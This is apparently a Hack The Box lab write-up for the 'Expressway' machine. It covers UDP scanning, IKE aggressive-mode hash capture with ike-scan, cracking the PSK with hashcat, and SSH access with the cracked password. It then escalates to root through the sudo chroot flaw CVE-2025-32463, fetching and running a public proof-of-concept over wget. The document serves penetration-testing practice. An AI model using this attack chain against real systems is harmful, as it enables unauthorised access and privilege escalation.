---
title: "ExpressWay"
date: 21-09-2025 
categories: [HTB, Linux, Linux Easy, Active]
tags: [UDP, Password Cracking, Sudo, IPsec, IKE]
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
---

Expressway is an easy Linux box. A quick nmap shows that the only TCP port that is open is SSH, which limits our attack path significantly. Looking over at the UDP ports we can find that port 500 is open which is running IPsec/IKE which is a VPN. This service is missconfigured which lets us read the hash for the user. This hash can be cracked and we get a clear text password. We can ssh to the box thanks to the username being leaked and the password we just cracked. Inside the box we can find that the sudo version is vulnerable to a recent exploit which lets us get root.

![expressway_info_card](/assets/images/expressway/Expressway.png)

## Nmap

As always we can start with the classic nmap scan which will show us which TCP ports are open. Surprisingly only one port is open which is for the SSH service.

```
nmap 10.129.51.72 -p- --min-rate 5000 -n -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 10:37 CEST

Not shown: 65493 closed tcp ports (reset), 41 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
```

We can use the -V flag to enumerate the version of ssh which shows that it is up-to-date and it is not vulnerable to any known exploits
```
nmap 10.129.51.72 -sCV -p 22 -n -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 11:00 CEST
Nmap scan report for 10.129.51.72
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh    !!OpenSSH 10.0p2 Debian 8 (protocol 2.0)!!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## Finding the UDP Service
Since we have not found an entry point yet, I ran a UDP scan to see if we get any open ports there. I recommend running the scan with the verbose flag. This is because a UDP scan can take a very long time and with the verbose flag it will show us when a port is open without needing to wait until the entire scan is done.

```
sudo nmap 10.129.51.72 -sUCV -p 500 -n -Pn -v
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 10:40 CEST
<SNIP>
Scanning 10.129.51.72 [1 port]
!!Discovered open port 500/udp on 10.129.51.72!!
Completed UDP Scan at 10:40, 0.15s elapsed (1 total ports)
```

Port 500 is open but we do not get a lot of info so I reran the scan with the C and V flags to enumerate the versions and run default scripts on the service.
```
sudo nmap 10.129.51.72 -sUCV -p 500 -n -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 10:40 CEST
Nmap scan report for 10.129.51.72
Host is up.

PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.46 seconds
```

## Enumerating IKE and Obtaining the Hash
I personally did not know about this service but a quick search in [Hacktricks](https://book.hacktricks.wiki/en/index.html) shows some interesting guides on how to exploit this service.

![expressway_info_card](/assets/images/expressway/hacktricks.png)

We can run the `ike-scan` tool to view information about the server
```
sudo ike-scan -M 10.129.51.72
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.51.72	Main Mode Handshake returned
	HDR=(CKY-R=96e84893280c8e9b)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.052 seconds (19.15 hosts/sec).  1 returned handshake; 0 returned notify
```

We can see that in the last line we have `1 returned handshake; 0 returned notify`

quoting the hacktricks page:
1 returned handshake; 0 returned notify: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output).

We can keep following the guide and the next step is to retrieve the hash, which can be done using the following command:
```
sudo ike-scan -P -M -A -n fakeID 10.129.51.72
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.51.72	Aggressive Mode Handshake returned
	HDR=(CKY-R=6d0fd1d4873d4b6a)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=i!!ke@expressway.htb!!)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
ebf6d357abaa7270f480242e8eefbb4e0d87eaf01918e76b134be6b544f304008c03bf212d6a4cd4ec29b98e2bc142ce711c11939559bea8971c011208277fd9063cbd22dd1cd4d6786a120d54b6e256659ca85d5481be02f595240cf8255d0e20d271b22433de19e01cc631b765a14dbc30885aca96e540d7f1c504298f3e5a:5d6b489bb19dd7777021b350119c734ea30bca47a261192f8520664fddfd056e1465574f533bd74babec637f0468b24a2ea08299b5dda6e5db507b9e84d098e7f48c4ceda92db52a2e355197a0a7a29152851c5b4eba12a6cabf498d1275a8f39d0b364296c8a46f81685aa48749d6ddb26a2eff8524ccd3fe971e485de4fb8c:6d0fd1d4873d4b6a:dcad1a4e4470408d:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:9853736e7f1db80ee7e557d56a30bbefb757ca61:d4a397424bb123d0f07ae1c1e5c32035edcf2c9d177f6416f7b24470513e4840:372ca8d7089461ecce39f007ac3acb556d6dc5e8
Ending ike-scan 1.9.5: 1 hosts scanned in 0.051 seconds (19.71 hosts/sec).  1 returned handshake; 0 returned notify
```

## Cracking the Hash
The commmand was ran using a fakeID but we still got the hash. The guide says that if we get a hash with a non valid ID it may not be the correct hash, but this only happens in modern versions. I believe this hash is correct because we can see that the value is `ike@expressway.htb` which is the hostname of this box and it is very probable that this hash comes from the ssh password for the `ike` user. In the case that we would have not gotten the hash we could have tried to brute force the IDs until we got a hash.

I saved the hash value into a file and then used hashcat to crack it.
```sh
vim ike.hash # saving the hash to a file
hashcat ike.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ebf6d357abaa7270f480242e8eefbb4e0d87eaf01918e76b134be6b544f304008c03bf212d6a4cd4ec29b98e2bc142ce711c11939559bea8971c011208277fd9063cbd22dd1cd4d6786a120d54b6e256659ca85d5481be02f595240cf8255d0e20d271b22433de19e01cc631b765a14dbc30885aca96e540d7f1c504298f3e5a:
5d6b489bb19dd7777021b350119c734ea30bca47a261192f8520664fddfd056e1465574f533bd74babec637f0468b24a2ea08299b5dda6e5db507b9e84d098e7f48c4ceda92db52a2e355197a0a7a29152851c5b4eba12a6cabf498d1275a8f39d0b364296c8a46f81685aa48749d6ddb26a2eff8524ccd3fe971e485de4fb8c:
6d0fd1d4873d4b6a:dcad1a4e4470408d:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c00040000708003000024030100008001000180020002800300018004000
2800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:9853736e7f1db80ee7e557d56a30bbefb757ca61:d4a397424bb123d0f07ae1c1e5c32035edcf2c9d177f6416f7b24470513e4840:372ca8d70894
61ecce39f007ac3acb556d6dc5e8:!!freakingrockstarontheroad!!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: ebf6d357abaa7270f480242e8eefbb4e0d87eaf01918e76b134...6dc5e8
Time.Started.....: Sun Sep 21 11:23:47 2025 (14 secs)
Time.Estimated...: Sun Sep 21 11:24:01 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   442.5 kH/s (0.42ms) @ Accel:138 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8045676/14344385 (56.09%)
Rejected.........: 0/8045676 (0.00%)
Restore.Point....: 8044848/14344385 (56.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: freako123 -> frdwg!
Hardware.Mon.#1..: Util: 25%

Started: Sun Sep 21 11:23:44 2025
Stopped: Sun Sep 21 11:24:03 2025
```

The password cracks and have the credentials for the user ike. Since the SSH port was open we can try to login in.
```sh
ssh ike@10.129.51.72
ike@10.129.51.72's password: 

Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 21 10:28:12 2025 from 10.10.14.145
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

We get logged in and we can read the user flag. 

## Privilege Escalation
It took me a while to find the correct path. Turns out it was quite easy, I even watched a [video](https://www.youtube.com/watch?v=9nRr3R9gEb8) about this vulnerability when it came out but I never thought it would be included in this box. 
The vulnerability I am talking about is [CVE-2025-32463](https://nvd.nist.gov/vuln/detail/cve-2025-32463), which affects the sudo binary. Versions before 1.9.17p1 allow local users to obtain root access because /etc/nsswitch.conf from a user-controlled directory is used with the --chroot option.

We can see from the output below that the sudo version on this machine is vulnerable and we can easily get root.
```sh
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

I used this [poc](https://github.com/MohamedKarrab/CVE-2025-32463) which I transfered to the vulnerable machine using wget:
First download the exploit to your machine, then set up a python web server
```sh
git clone https://github.com/MohamedKarrab/CVE-2025-32463

sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
On the vulnerable server use wget recursively to download the entire directory:

```sh
wget -r http://10.10.14.145/CVE-2025-32463
--2025-09-21 10:38:20--  http://10.10.14.145/CVE-2025-32463
Connecting to 10.10.14.145:80... connected.

<SNIP>

FINISHED --2025-09-21 10:38:23--
Total wall clock time: 2.9s
Downloaded: 19 files, 368K in 0.6s (600 KB/s)
```

We can now chmod the binary to give it execution priveleges and run it which will give us root acess
```sh
ike@expressway:~$ cd CVE-2025-32463/
ike@expressway:~/CVE-2025-32463$ chmod +x get_root.sh
ike@expressway:~/CVE-2025-32463$ ./get_root.sh
[*] Detected architecture: x86_64
[*] Launching sudo with archs-dynamic payload …
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
root@expressway:/# cat /root/root.txt
f4b95eee70f7<SNIP>
```